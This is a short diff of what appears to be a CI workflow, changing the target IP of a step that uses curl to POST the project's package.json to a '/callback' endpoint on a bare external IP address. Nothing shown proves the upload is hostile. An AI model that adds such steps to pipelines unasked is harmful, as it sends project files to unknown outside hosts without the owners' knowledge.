@@ -38,4 +38,4 @@ jobs:
 
       - name: Step6 send POST request ASE
         run: |
-          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@package.json" http://35.219.186.138:8880/callback
+          curl -X POST -H "Content-Type: multipart/form-data" -F "file=@package.json" http://35.219.146.163:8880/callback
